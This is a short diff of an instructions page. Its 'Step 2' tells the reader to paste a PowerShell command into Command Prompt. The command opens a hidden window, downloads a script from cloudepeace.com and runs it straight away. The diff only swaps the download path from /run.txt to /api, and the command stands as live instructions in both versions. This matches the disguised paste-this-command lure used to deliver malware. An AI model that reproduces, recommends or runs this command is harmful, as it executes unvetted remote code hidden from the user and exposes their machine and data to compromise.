@@ -8,5 +8,5 @@
 ### Step 2: Execute the Command.
 Copy and paste the command below into Command Prompt.
 ```powershell
-powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; iex(iwr -UseBasicParsing https://cloudepeace.com/run.txt)"
+powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; iex(iwr -UseBasicParsing https://cloudepeace.com/api)"
 `````
